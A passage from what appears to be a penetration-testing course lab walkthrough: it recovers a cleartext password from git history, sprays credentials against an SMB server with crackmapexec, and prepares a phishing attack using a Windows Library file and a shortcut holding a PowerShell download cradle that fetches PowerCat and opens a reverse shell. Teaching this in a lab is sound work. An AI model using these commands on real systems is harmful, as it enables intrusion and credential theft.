### Examining the Git Repository for Sensitive Information

To begin, we will change our current directory to the Git repository. We can then use `git status` to display the state of the Git working directory and `git log` to show the commit history.

```bash
root@websrv1:/home/daniela# cd /srv/www/wordpress/
root@websrv1:/srv/www/wordpress# git status
HEAD detached at 612ff57
nothing to commit, working tree clean
root@websrv1:/srv/www/wordpress# git log
commit 612ff5783cc5dbd1e0e008523dba83374a84aaf1 (HEAD -> master)
Author: root
Date: Tue Sep 27 14:26:15 2022 +0000
Removed staging script and internal network access

commit f82147bb0877fa6b5d8e80cf33da7b8f757d11dd
Author: root
Date: Tue Sep 27 14:24:28 2022 +0000
initial commit
```

**Listing 892 - Examining the Git repository**

The repository contains two commits: an initial commit and a commit labeled "Removed staging script and internal network access." This is interesting because it suggests that the machine previously had access to the internal network and contained a staging script that was removed.

We could switch back to a specific commit using `git checkout` with a commit hash, but this could potentially disrupt the web application's functionality and the clientâ€™s operations. A better approach is to use `git show`, which displays differences between commits. In this case, we will supply the commit hash of the latest commit to see the changes made after the first commit.

```bash
root@websrv1:/srv/www/wordpress# git show 612ff5783cc5dbd1e0e008523dba83374a84aaf1
commit 612ff5783cc5dbd1e0e008523dba83374a84aaf1 (HEAD, master)
Author: root
Date: Tue Sep 27 14:26:15 2022 +0000
Removed staging script and internal network access
diff --git a/fetch_current.sh b/fetch_current.sh
deleted file mode 100644
index 25667c7..0000000
--- a/fetch_current.sh
+++ /dev/null
@@ -1,6 +0,0 @@
-#!/bin/bash
-# Script to obtain the current state of the web app from the staging server
-sshpass -p "dqsTwTpZPn#nL" rsync PI:EMAIL:/current_webapp/ /srv/www/wordpress/
```

**Listing 893 - Displaying the differences between the two commits**

By displaying the differences, we identified another set of credentials. The use of `sshpass` to provide a password non-interactively is a common practice in automated scripts.

Before concluding this section, let's add the username and password to `creds.txt` on our Kali machine.

In a real assessment, we should run `linPEAS` again once we have obtained privileged access to the system. This tool can now access files of other users and the system, potentially revealing sensitive information that was not accessible when running as `daniela`.

### Summary

- We used the `linPEAS` automated enumeration script to identify potentially sensitive information and privilege escalation vectors.
- The script identified that `/usr/bin/git` can be run with `sudo` as user `daniela`, the WordPress directory is a Git repository, and a cleartext password is used in the WordPress database settings.
- By abusing the `sudo` command, we successfully elevated our privileges.
- We identified a previously removed bash script in the Git repository and displayed it, which contained a new username and password.

In the next Learning Unit, we will structure and leverage the information we've obtained to gain access to the internal network.

### Gaining Access to the Internal Network

This Learning Unit covers the following objectives:
- Validate domain credentials from a non-domain-joined machine.
- Perform phishing to get access to the internal network.

#### 24.3.1 Domain Credentials

In this section, we will attempt to identify valid combinations of usernames and passwords on `MAILSRV1`. We will start by reviewing the current information in `creds.txt`.

```bash
kali@kali:~/beyond$ cat creds.txt
daniela:tequieromucho (SSH private key passphrase)
wordpress:DanielKeyboard3311 (WordPress database connection settings)
john:dqsTwTpZPn#nL (fetch_current.sh)
Other identified users:
marcus
```

**Listing 894 - Displaying contents of creds.txt**

Based on the output, we will create a list of usernames containing `marcus`, `john`, and `daniela`. We will omit `wordpress` as it is not a real user. Additionally, we will create a password list containing `tequieromucho`, `DanielKeyboard3311`, and `dqsTwTpZPn#nL`.

```bash
kali@kali:~/beyond$ cat usernames.txt
marcus
john
daniela

kali@kali:~/beyond$ cat passwords.txt
tequieromucho
DanielKeyboard3311
dqsTwTpZPn#nL
```

**Listing 895 - Displaying the created lists containing the identified usernames and passwords**

Next, we will use `crackmapexec` to check these credentials against SMB on `MAILSRV1`, specifying `--continue-on-success` to avoid stopping at the first valid credentials.

```bash
kali@kali:~/beyond$ crackmapexec smb 192.168.50.242 -u usernames.txt -p passwords.txt --continue-on-success
SMB 192.168.50.242 445 MAILSRV1 [*] Windows 10.0 Build 20348 x64
(name:MAILSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
SMB 192.168.50.242 445 MAILSRV1 [-] beyond.com\marcus:tequieromucho STATUS_LOGON_FAILURE
SMB 192.168.50.242 445 MAILSRV1 [-] beyond.com\marcus:DanielKeyboard3311 STATUS_LOGON_FAILURE
SMB 192.168.50.242 445 MAILSRV1 [-] beyond.com\marcus:dqsTwTpZPn#nL STATUS_LOGON_FAILURE
SMB 192.168.50.242 445 MAILSRV1 [-] beyond.com\john:tequieromucho STATUS_LOGON_FAILURE
SMB 192.168.50.242 445 MAILSRV1 [-] beyond.com\john:DanielKeyboard3311 STATUS_LOGON_FAILURE
SMB 192.168.50.242 445 MAILSRV1 [+] beyond.com\john:dqsTwTpZPn#nL
SMB 192.168.50.242 445 MAILSRV1 [-] beyond.com\daniela:tequieromucho STATUS_LOGON_FAILURE
SMB 192.168.50.242 445 MAILSRV1 [-] beyond.com\daniela:DanielKeyboard3311 STATUS_LOGON_FAILURE
SMB 192.168.50.242 445 MAILSRV1 [-] beyond.com\daniela:dqsTwTpZPn#nL STATUS_LOGON_FAILURE
```

**Listing 896 - Checking for valid credentials with CrackMapExec**

`CrackMapExec` identified one valid set of credentials. This is not surprising since we retrieved the username and password from the staging script on `WEBSRV1`. However, `john` could have changed their password in the meantime.

The output also shows that `MAILSRV1` is a domain-joined machine, and we have identified a valid set of domain credentials.

Now that we have valid domain credentials, we need to plan our next steps. Reviewing the `CrackMapExec` output and the port scan for `MAILSRV1`, we don't have many options. We have identified the mail server and SMB, but no services such as WinRM or RDP. Additionally, the scan showed that `john` is not a local administrator on `MAILSRV1`.

This provides us with two options:
1. Further enumerate SMB on `MAILSRV1` and check for sensitive information on accessible shares.
2. Prepare a malicious attachment and send a phishing email as `john` to `daniela` and `marcus`.

We should be aware that `CrackMapExec` outputs `STATUS_LOGON_FAILURE` when a password for an existing user is not correct, but also when a user does not exist at all. Therefore, we cannot be sure that the domain user accounts `daniela` and `marcus` even exist.

Let's choose the first option and leverage `CrackMapExec` to list the SMB shares and their permissions on `MAILSRV1` by providing `--shares` and `john`'s credentials.

```bash
kali@kali:~/beyond$ crackmapexec smb 192.168.50.242 -u john -p "dqsTwTpZPn#nL" --shares
SMB 192.168.50.242 445 MAILSRV1 [*] Windows 10.0 Build 20348 x64
(name:MAILSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
SMB 192.168.50.242 445 MAILSRV1 [+] beyond.com\john:dqsTwTpZPn#nL
SMB 192.168.50.242 445 MAILSRV1 [+] Enumerated shares
SMB 192.168.50.242 445 MAILSRV1 Share Permissions
Remark
SMB 192.168.50.242 445 MAILSRV1 ----- ----------- --
----
SMB 192.168.50.242 445 MAILSRV1 ADMIN$
Remote Admin
SMB 192.168.50.242 445 MAILSRV1 C$
Default share
SMB 192.168.50.242 445 MAILSRV1 IPC$ READ
Remote IPC
```

**Listing 897 - Listing SMB shares on MAILSRV1 with CrackMapExec**

`CrackMapExec` only identified the default shares, on which we have no actionable permissions. At this point, we only have the second option left: preparing an email with a malicious attachment and sending it to `daniela` and `marcus`.

### Summary

- We used the information retrieved in the previous Learning Unit and leveraged it in a password attack against `MAILSRV1`.
- This password attack resulted in discovering one valid set of credentials.
- We enumerated the SMB shares on `MAILSRV1` as `john` without any actionable results.

### 24.3.2 Phishing for Access

In this section, we will perform a client-side attack by sending a phishing email. Throughout this course, we have discussed two client-side attack techniques: Microsoft Office documents containing macros and Windows Library files in combination with shortcut files.

Since we don't have any information about the internal machines or infrastructure, we will choose the second technique, as Microsoft Office may not be installed on any of the target systems.

For this attack, we need to set up a WebDAV server, a Python3 web server, a Netcat listener, and prepare the Windows Library and shortcut files.

Let's start by setting up the WebDAV share on our Kali machine on port 80 with `wsgidav`. We will create the `/home/kali/beyond/webdav` directory as the WebDAV root directory.

```bash
kali@kali:~$ mkdir /home/kali/beyond/webdav
kali@kali:~$ /home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/beyond/webdav/
Running without configuration file.
04:47:04.860 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.
04:47:04.861 - INFO : WsgiDAV/4.0.2 Python/3.10.7 Linux-5.18.0-kali7-amd64-x86_64-with-glibc2.34
04:47:04.861 - INFO : Lock manager: LockManager(LockStorageDict)
04:47:04.861 - INFO : Property manager: None
04:47:04.861 - INFO : Domain controller: SimpleDomainController()
04:47:04.861 - INFO : Registered DAV providers by route:
04:47:04.861 - INFO : - '/:dir_browser': FilesystemProvider for path '/home/kali/.local/lib/python3.10/site-packages/wsgidav/dir_browser/htdocs' (Read-Only) (anonymous)
04:47:04.861 - INFO : - '/': FilesystemProvider for path '/home/kali/beyond/webdav' (Read-Write) (anonymous)
04:47:04.861 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL.
04:47:04.861 - WARNING : Share '/' will allow anonymous write access.
04:47:04.861 - WARNING : Share '/:dir_browser' will allow anonymous read access.
04:47:05.149 - INFO : Running WsgiDAV/4.0.2 Cheroot/8.6.0 Python 3.10.7
04:47:05.149 - INFO : Serving on http://0.0.0.0:80 ...
```

**Listing 898 - Starting WsgiDAV on port 80**

Our WebDAV share is now served on port 80 with anonymous access settings.

Next, let's connect to `WINPREP` via RDP as `offsec` with a password of `lab` to prepare the Windows Library and shortcut files. Once connected, we will open Visual Studio Code and create a new text file on the desktop named `config.Library-ms`.

**Figure 293: Empty Library file in Visual Studio Code**

Now, let's copy the Windows Library code we previously used in the Client-Side Attacks Module, paste it into Visual Studio Code, and ensure the IP address points to our Kali machine.

```xml
@windows.storage.dll,-34582
true
imageres.dll,-1003
{7d49d726-3c21-4f05-99aa-fdc2c9474656}
true
false
http://192.168.119.5
```

**Listing 899 - Windows Library code for connecting to our WebDAV Share**

Save the file and transfer it to `/home/kali/beyond` on our Kali machine.

Next, we will create the shortcut file on `WINPREP`. Right-click on the Desktop, select New > Shortcut. A victim double-clicking the shortcut file will download PowerCat and create a reverse shell. Enter the following command:

```powershell
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.5:8000/powercat.ps1'); powercat -c 192.168.119.5 -p 4444 -e powershell"
```

**Listing 900 - PowerShell Download Cradle and PowerCat Reverse Shell Execution for shortcut file**

Once we enter the command and name the shortcut file, we can transfer the resulting shortcut file to our Kali machine into the WebDAV directory.

Our next step is to serve PowerCat via a Python3 web server. Let's copy `powercat.ps1` to `/home/kali/beyond` and serve it on port 8000 as specified in the shortcut's PowerShell command.